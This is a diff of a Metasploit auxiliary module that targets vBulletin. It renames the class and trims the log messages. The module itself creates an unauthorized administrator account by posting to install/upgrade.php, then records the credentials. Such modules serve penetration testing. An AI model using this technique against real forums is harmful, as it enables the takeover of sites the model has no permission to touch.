@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
@@ -79,11 +79,11 @@ class Metasploit3 < Msf::Auxiliary
   def run
 
     if user == pass
-      print_error("#{peer} - Please select a password different than the username")
+      print_error("Please select a password different than the username")
       return
     end
 
-    print_status("#{peer} - Trying a new admin vBulletin account...")
+    print_status("Trying a new admin vBulletin account...")
 
     res = send_request_cgi({
       'uri'       => normalize_uri(target_uri.path, "install", "upgrade.php"),
@@ -110,7 +110,7 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if res and res.code == 200 and res.body =~ /Administrator account created/
-      print_good("#{peer} - Admin account with credentials #{user}:#{pass} successfully created")
+      print_good("Admin account with credentials #{user}:#{pass} successfully created")
       report_cred(
         ip: rhost,
         port: rport,
@@ -120,7 +120,7 @@ class Metasploit3 < Msf::Auxiliary
         proof: res.body
       )
     else
-      print_error("#{peer} - Admin account creation failed")
+      print_error("Admin account creation failed")
     end
   end
 end
